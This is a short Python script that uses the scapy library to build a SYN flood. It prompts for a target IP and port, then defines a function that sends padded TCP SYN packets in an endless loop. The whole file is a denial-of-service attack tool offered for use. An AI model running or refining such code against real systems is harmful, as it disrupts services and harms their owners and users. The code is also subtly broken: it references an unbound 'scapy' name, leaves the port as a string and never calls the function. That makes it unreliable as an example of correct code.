from scapy.all import *

target_ip = input("Enter ip you want to flood: ")
target_port = input("Enter which port you want to flood: ")
    
def syn(target_ip,target_port):
    ip = scapy.IP(dst=target_ip)
    tcp = scapy.TCP(sport = scapy.RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)    